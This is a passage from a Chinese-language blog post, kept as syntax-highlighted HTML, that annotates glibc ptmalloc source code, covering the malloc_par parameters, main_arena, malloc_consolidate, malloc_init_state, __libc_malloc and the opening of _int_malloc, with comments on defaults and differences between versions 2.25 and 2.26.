class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> trim_threshold;<br>  INTERNAL_SIZE_T top_pad;<br>  INTERNAL_SIZE_T mmap_threshold;<br>  INTERNAL_SIZE_T arena_test;<br>  INTERNAL_SIZE_T arena_max;<br><br>  <span class="hljs-comment">/* Memory map support */</span><br>  <span class="hljs-keyword">int</span> n_mmaps;<br>  <span class="hljs-keyword">int</span> n_mmaps_max;<br>  <span class="hljs-keyword">int</span> max_n_mmaps;<br>  <span class="hljs-comment">/* the mmap_threshold is dynamic, until the user sets</span><br><span class="hljs-comment">     it manually, at which point we need to disable any</span><br><span class="hljs-comment">     dynamic behavior. */</span><br>  <span class="hljs-keyword">int</span> no_dyn_threshold;<br><br>  <span class="hljs-comment">/* Statistics */</span><br>  INTERNAL_SIZE_T mmapped_mem;<br>  INTERNAL_SIZE_T max_mmapped_mem;<br><br>  <span class="hljs-comment">/* First address handed out by MORECORE/sbrk.  */</span><br>  <span class="hljs-keyword">char</span> *sbrk_base;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-comment">/* Maximum number of buckets to use.  */</span><br>  <span class="hljs-keyword">size_t</span> tcache_bins;<br>  <span class="hljs-keyword">size_t</span> tcache_max_bytes;<br>  <span class="hljs-comment">/* Maximum number of chunks in each bucket.  */</span><br>  <span class="hljs-keyword">size_t</span> tcache_count;<br>  <span class="hljs-comment">/* Maximum number of chunks to remove from the unsorted list, which</span><br><span class="hljs-comment">     aren&#x27;t used to prefill the cache.  */</span><br>  <span class="hljs-keyword">size_t</span> tcache_unsorted_limit;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>当每个分配区的 top chunk 大小大于<strong>trim_threshold</strong>时，在一定的条件下，调用 free 时会收缩内存，减小 top chunk 的大小。</li><li><strong>top_pad</strong> 字段表示在分配内存时是否添加额外的 pad，默认该字段为 0。 </li><li><strong>mmap_threshold</strong> 字段表示 mmap 分配阈值，默认值为 128KB，在 32 位系统上最大值为 512KB，64 位系统上的最大值为 32MB，由于默认开启 mmap 分配阈值动态调整，该字段的 值会动态修改，但不会超过最大值。 </li><li><strong>arena_test</strong> 和 <strong>arena_max</strong> 用于 PER_THREAD 优化，在 32 位系统上 arena_test 默认值为 2， 64 位系统上的默认值为 8，当每个进程的分配区数量小于等于 arena_test 时，不会重用已有 的分配区。为了限制分配区的总数，用 arena_max 来保存分配区的最大数量，当系统中的分 配区数量达到 arena_max，就不会再创建新的分配区，只会重用已有的分配区。这两个字段 都可以使用 mallopt()函数设置。 </li><li><strong>n_mmaps</strong> 字段表示当前进程使用 mmap()函数分配的内存块的个数。 </li><li><strong>n_mmaps_max</strong> 字段表示进程使用 mmap()函数分配的内存块的最大数量，默认值为65536，可以使用 mallopt()函数修改</li><li><strong>max_n_mmaps</strong> 字段表示当前进程使用 mmap()函数分配的内存块的数量的最大值，有关系 n_mmaps &lt;= max_n_mmaps 成立。这个字段是由于 mstats()函数输出统计需要这个字段。 </li><li><strong>no_dyn_threshold</strong> 字段表示是否开启 mmap 分配阈值动态调整机制，默认值为 0，也就 是默认开启 mmap 分配阈值动态调整机制。 </li><li><strong>pagesize</strong> 字段表示系统的页大小，默认为 4KB。 </li><li><strong>mmapped_mem</strong> 和 <strong>max_mmapped_mem</strong> 都用于统计 mmap 分配的内存大小，一般情况 下两个字段的值相等，max_mmapped_mem 用于 mstats()函数。 </li><li><strong>max_total_mem</strong> 字段在单线程情况下用于统计进程分配的内存总数。 </li><li><strong>sbrk_base</strong> 字段表示堆的起始地址。</li></ul><h3 id="main-arena"><a href="#main-arena" class="headerlink" title="main_arena"></a>main_arena</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> <span class="hljs-title">main_arena</span> =</span> <span class="hljs-comment">//main_arena是一个里libc中的全局静态变量</span><br>&#123;<br>  .mutex = _LIBC_LOCK_INITIALIZER,<br>  .next = &amp;main_arena,<br>  .attached_threads = <span class="hljs-number">1</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><h3 id="mp"><a href="#mp" class="headerlink" title="mp_"></a>mp_</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* There is only one instance of the malloc parameters.  */</span><br><br><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_par</span> <span class="hljs-title">mp_</span> =</span><br>&#123;<br>  .top_pad = DEFAULT_TOP_PAD,<br>  .n_mmaps_max = DEFAULT_MMAP_MAX,<br>  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,<br>  .trim_threshold = DEFAULT_TRIM_THRESHOLD,<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))</span><br>  .arena_test = NARENAS_FROM_NCORES (<span class="hljs-number">1</span>)<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  ,<br>  .tcache_count = TCACHE_FILL_COUNT,<br>  .tcache_bins = TCACHE_MAX_BINS,<br>  .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS<span class="hljs-number">-1</span>),<br>  .tcache_unsorted_limit = <span class="hljs-number">0</span> <span class="hljs-comment">/* No limit.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>设置了<code>top_pad</code>为 0</li><li>设置了<code>n_maps_max</code>为 65535</li><li>设置了<code>mmap_threshold</code>为 128 * 1024</li><li>设置了<code>trim_threshold</code>为 128 * 1024</li><li>设置了<code>arena_test</code>在gcc中32下为2，64位下为8（不同的编译器中long的长度可能不同，这里仅以gcc为例）</li></ul><h3 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a><span id="malloc_consolidate"><strong>malloc_consolidate</strong></span></h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">  ------------------------- malloc_consolidate -------------------------</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  malloc_consolidate is a specialized version of free() that tears</span><br><span class="hljs-comment">  down chunks held in fastbins.  Free itself cannot be used for this</span><br><span class="hljs-comment">  purpose since, among other things, it might place chunks back onto</span><br><span class="hljs-comment">  fastbins.  So, instead, we need to use a minor variant of the same</span><br><span class="hljs-comment">  code.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  Also, because this routine needs to be called the first time through</span><br><span class="hljs-comment">  malloc anyway, it turns out to be the perfect place to trigger</span><br><span class="hljs-comment">  initialization code.</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">malloc_consolidate</span><span class="hljs-params">(mstate av)</span></span><br><span class="hljs-function"></span>&#123;<br>  mfastbinptr*    fb;                 <span class="hljs-comment">/* current fastbin being consolidated */</span><br>  mfastbinptr*    maxfb;              <span class="hljs-comment">/* last fastbin (for loop control) */</span><br>  mchunkptr       p;                  <span class="hljs-comment">/* current chunk being consolidated */</span><br>  mchunkptr       nextp;              <span class="hljs-comment">/* next chunk to consolidate */</span><br>  mchunkptr       unsorted_bin;       <span class="hljs-comment">/* bin header */</span><br>  mchunkptr       first_unsorted;     <span class="hljs-comment">/* chunk to link to */</span><br><br>  <span class="hljs-comment">/* These have same use as in free() */</span><br>  mchunkptr       nextchunk;<br>  INTERNAL_SIZE_T size;<br>  INTERNAL_SIZE_T nextsize;<br>  INTERNAL_SIZE_T prevsize;<br>  <span class="hljs-keyword">int</span>             nextinuse;<br>  mchunkptr       bck;<br>  mchunkptr       fwd;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      If max_fast is 0, we know that av hasn&#x27;t</span><br><span class="hljs-comment">      yet been initialized, in which case do so below</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-comment">// 说明 fastbin 已经初始化</span><br>    <span class="hljs-keyword">if</span> (get_max_fast() != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// 清空 fastbin 标记</span><br>        <span class="hljs-comment">// 因为要合并 fastbin 中的 chunk 了。</span><br>        clear_fastchunks(av);<br>        <span class="hljs-comment">//</span><br>        unsorted_bin = unsorted_chunks(av);<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">          Remove each chunk from fast bin and consolidate it, placing it</span><br><span class="hljs-comment">          then in unsorted bin. Among other reasons for doing this,</span><br><span class="hljs-comment">          placing in unsorted bin avoids needing to calculate actual bins</span><br><span class="hljs-comment">          until malloc is sure that chunks aren&#x27;t immediately going to be</span><br><span class="hljs-comment">          reused anyway.</span><br><span class="hljs-comment">        */</span><br>        <span class="hljs-comment">// 按照 fd 顺序遍历 fastbin 的每一个 bin，将 bin 中的每一个 chunk 合并掉。</span><br>        maxfb = &amp;fastbin(av, NFASTBINS - <span class="hljs-number">1</span>);<br>        fb    = &amp;fastbin(av, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">do</span> &#123;<br>            p = atomic_exchange_acq(fb, <span class="hljs-literal">NULL</span>);<br>            <span class="hljs-keyword">if</span> (p != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">do</span> &#123;<br>                    check_inuse_chunk(av, p);<br>                    nextp = p-&gt;fd;<br><br>                    <span class="hljs-comment">/* Slightly streamlined version of consolidation code in</span><br><span class="hljs-comment">                     * free() */</span><br>                    size      = chunksize(p);<br>                    nextchunk = chunk_at_offset(p, size);<br>                    nextsize  = chunksize(nextchunk);<br><br>                    <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<span class="hljs-comment">//p的前一块空闲马上取出, 计算合并后大小</span><br>                        prevsize = prev_size(p);<br>                        size += prevsize;<br>                        p = chunk_at_offset(p, -((<span class="hljs-keyword">long</span>) prevsize));<br>                        unlink(av, p, bck, fwd);<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123; <br>                        <span class="hljs-comment">// 判断 nextchunk 是否是空闲的。</span><br>                        nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br><br>                        <span class="hljs-keyword">if</span> (!nextinuse) &#123; <span class="hljs-comment">//p的后一块空闲马上取出, 计算合并后大小</span><br>                            size += nextsize;<br>                            unlink(av, nextchunk, bck, fwd);<br>                        &#125; <span class="hljs-keyword">else</span><br>                         <span class="hljs-comment">// 设置 nextchunk 的 prev inuse 为0，以表明可以合并当前 fast chunk。</span><br>                            clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br>                        <br>                        <span class="hljs-comment">//插入unsorted bin的常规操作</span><br>                        first_unsorted     = unsorted_bin-&gt;fd;<br>                        unsorted_bin-&gt;fd   = p;<br>                        first_unsorted-&gt;bk = p;<br><br>                        <span class="hljs-keyword">if</span> (!in_smallbin_range(size)) &#123;<br>                            p-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                            p-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                        &#125;<br><br>                        set_head(p, size | PREV_INUSE);<br>                        p-&gt;bk = unsorted_bin;<br>                        p-&gt;fd = first_unsorted;<br>                        set_foot(p, size);<br>                    &#125;<br>                    <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">//直接和top chunk合并</span><br>                        size += nextsize;<br>                        set_head(p, size | PREV_INUSE);<br>                        av-&gt;top = p;<br>                    &#125;<br><br>                &#125; <span class="hljs-keyword">while</span> ((p = nextp) != <span class="hljs-number">0</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">while</span> (fb++ != maxfb);<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">//如果还没有初始化</span><br>    malloc_init_state(av);<br>    check_malloc_state(av);<br>  &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="malloc-init-state"><a href="#malloc-init-state" class="headerlink" title="malloc_init_state"></a>malloc_init_state</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Initialize a malloc_state struct.</span><br><span class="hljs-comment">   This is called from ptmalloc_init () or from _int_new_arena ()</span><br><span class="hljs-comment">   when creating a new arena.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">malloc_init_state</span><span class="hljs-params">(mstate av)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    mbinptr bin;<br>    <span class="hljs-comment">/* Establish circular links for normal bins */</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; NBINS; ++i)<br>    &#123;<br>        bin = bin_at(av, i);<br>        bin-&gt;fd = bin-&gt;bk = bin; <span class="hljs-comment">//初始化, 把所有指针都指向自己</span><br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> MORECORE_CONTIGUOUS</span><br>    <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>        set_noncontiguous(av);<br>    <span class="hljs-keyword">if</span> (av == &amp;main_arena)<br>        set_max_fast(DEFAULT_MXFAST);<br>    <span class="hljs-comment">//2.26, 一个arena在默认情况下并不拥有fastbin chunk</span><br>    atomic_store_relaxed(&amp;av-&gt;have_fastchunks, <span class="hljs-literal">false</span>);<br>    <span class="hljs-comment">//2.25:</span><br>    av-&gt;flags |= FASTCHUNKS_BIT;<br>    <span class="hljs-comment">//将该areva的top chunk指针指向unsorted bin，用以表示初始时top chunk大小为0</span><br>    av-&gt;top = initial_top(av);<br>&#125;<br></code></pre></div></td></tr></table></figure><h1 id="申请内存块"><a href="#申请内存块" class="headerlink" title="申请内存块"></a>申请内存块</h1><h2 id="–libc-malloc"><a href="#–libc-malloc" class="headerlink" title="  –libc-malloc"></a><span id="__libc_malloc"> </span> <a href="#libcmalloc">–libc-malloc</a></h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//这只是一个_int_malloc函数的简单wrapper</span><br><span class="hljs-keyword">void</span> * __libc_malloc (<span class="hljs-keyword">size_t</span> bytes)<br>&#123;<br>  mstate ar_ptr;<br>  <span class="hljs-keyword">void</span> *victim;<br>  <span class="hljs-comment">// 检查是否有内存分配钩子，如果有，调用钩子并返回.</span><br>  <span class="hljs-keyword">void</span> *(*hook) (<span class="hljs-keyword">size_t</span>, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *)<br>    = atomic_forced_read (__malloc_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br>    <br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-comment">/* int_free also calls request2size, be careful to not pad twice.  */</span><br>  <span class="hljs-keyword">size_t</span> tbytes = request2size (bytes);<br>  <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (tbytes);<br><br>  MAYBE_INIT_TCACHE ();<br><br>  DIAG_PUSH_NEEDS_COMMENT;<br>  <span class="hljs-keyword">if</span> (tc_idx &lt; mp_.tcache_bins<br>      <span class="hljs-comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="hljs-comment">/* to appease gcc */</span><br>      &amp;&amp; tcache<br>      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-keyword">return</span> tcache_get (tc_idx);<br>    &#125;<br>  DIAG_POP_NEEDS_COMMENT;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    <br>  <span class="hljs-comment">//接着会寻找一个 arena 来试图分配内存</span><br>  arena_get (ar_ptr, bytes);<br>  <span class="hljs-comment">//然后调用 _int_malloc 函数去申请对应的内存</span><br>  victim = _int_malloc (ar_ptr, bytes);<br>  <span class="hljs-comment">/* Retry with another arena only if we were able to find a usable arena</span><br><span class="hljs-comment">     before.  */</span><br>  <span class="hljs-keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="hljs-literal">NULL</span>)<br>    &#123;<span class="hljs-comment">//如果分配失败的话，ptmalloc 会尝试再去寻找一个可用的 arena，并分配内存</span><br>      LIBC_PROBE (memory_malloc_retry, <span class="hljs-number">1</span>, bytes);<br>      ar_ptr = arena_get_retry (ar_ptr, bytes);<br>      victim = _int_malloc (ar_ptr, bytes);<br>    &#125;<br><br>  <span class="hljs-keyword">if</span> (ar_ptr != <span class="hljs-literal">NULL</span>)<span class="hljs-comment">//如果申请到了 arena，那么在退出之前还得解锁</span><br>    __libc_lock_unlock (ar_ptr-&gt;mutex);<br>  <span class="hljs-comment">//要么没有申请到内存</span><br>  <span class="hljs-comment">//要么是 mmap 的内存</span><br>  <span class="hljs-comment">//要么申请到的内存必须在其所分配的 arena 中</span><br>  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||<br>          ar_ptr == arena_for_chunk (mem2chunk (victim)));<br>  <span class="hljs-comment">//最后返回内存</span><br>  <span class="hljs-keyword">return</span> victim;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="int-malloc-非常之长"><a href="#int-malloc-非常之长" class="headerlink" title="_int_malloc(非常之长)"></a>_int_malloc(非常之长)</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> * _int_malloc (mstate av, <span class="hljs-keyword">size_t</span> bytes)<br></code></pre></div></td></tr></table></figure><h3 id="变量定义"><a href="#变量定义" class="headerlink" title="变量定义"></a>变量定义</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">  INTERNAL_SIZE_T nb;               <span class="hljs-comment">/* normalized request size */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> idx;                 <span class="hljs-comment">/* associated bin index */</span><br>  mbinptr bin;                      <span class="hljs-comment">/* associated bin */</span><br>  mchunkptr victim;                 <span class="hljs-comment">/* inspected/selected chunk */</span><br>  INTERNAL_SIZE_T size;             <span class="hljs-comment">/* its size */</span><br>  <span class="hljs-keyword">int</span> victim_index;                 <span class="hljs-comment">/* its bin index */</span><br>  mchunkptr remainder;              <span class="hljs-comment">/* remainder from a split */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> remainder_size;     <span class="hljs-comment">/* its size */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> block;               <span class="hljs-comment">/* bit map traverser */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> bit;                 <span class="hljs-comment">/* bit map traverser */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-built_in">map</span>;                 <span class="hljs-comment">/* current word of binmap */</span><br>  mchunkptr fwd;                    <span class="hljs-comment">/* misc temp for linking */</span><br>  mchunkptr bck;                    <span class="hljs-comment">/* misc temp for linking */</span><br><span class="hljs-comment">//if glibc2.26 and after</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-keyword">size_t</span> tcache_unsorted_count;            <span class="hljs-comment">/* count of unsorted chunks processed */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> REMOVE_FB(fb, victim, pp)                        \</span><br><span class="hljs-meta">  do                                                        \</span><br><span class="hljs-meta">    &#123;                                                        \</span><br><span class="hljs-meta">      victim = pp;                                        \</span><br><span class="hljs-meta">      <span class="hljs-meta-keyword">if</span> (victim == NULL)                                \</span><br><span class="hljs-meta">        break;                                                \</span><br><span class="hljs-meta">    &#125;                                                        \</span><br><span class="hljs-meta">  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span><br><span class="hljs-meta">         != victim);   </span><br></code></pre></div></td></tr></table></figure><h3 id="简单的check"><a href="#简单的check" class="headerlink" title="简单的check"></a>简单的check</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">     Convert request size to internal form by adding SIZE_SZ bytes</span><br><span class="hljs-comment">     overhead plus possibly more to obtain necessary alignment and/or</span><br><span class="hljs-comment">     to obtain a size of at least MINSIZE, the smallest allocatable</span><br><span class="hljs-comment">     size. Also, checked_request2size traps (returning 0) request sizes</span><br><span class="hljs-comment">     that are so large that they wrap around zero when padded and</span><br><span class="hljs-comment">     aligned.</span><br><span class="hljs-comment">   */</span><br>  checked_request2size (bytes, nb);<br>  <span class="hljs-comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span><br><span class="hljs-comment">     mmap.  */</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (av == <span class="hljs-literal">NULL</span>))<br>    &#123;<br>      <span class="hljs-keyword">void</span> *p = sysmalloc (nb, av);<br>      <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>        alloc_perturb (p, bytes);<br>      <span class="hljs-keyword">return</span> p;<br>    &#125;<br></code></pre></div></td></tr></table></figure><ul><li>注意到checked_request2size()是一个宏定义, 可以<strong>改变参数nb的值</strong> </li></ul><h3 id="fastbin-range"><a href="#fastbin-range" class="headerlink" title="fastbin_range"></a>fastbin_range</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   If the size qualifies as a fastbin, first check corresponding bin.</span><br><span class="hljs-comment">   This code is safe to execute even if av is not yet initialized, so we</span><br><span class="hljs-comment">   can try it without checking, which saves some time on this fast path.</span><br><span class="hljs-comment"> */</span><br></code></pre></div></td></tr></table></figure><h4 id="2-25"><a href="#2-25" class="headerlink" title="2.25"></a>2.25</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 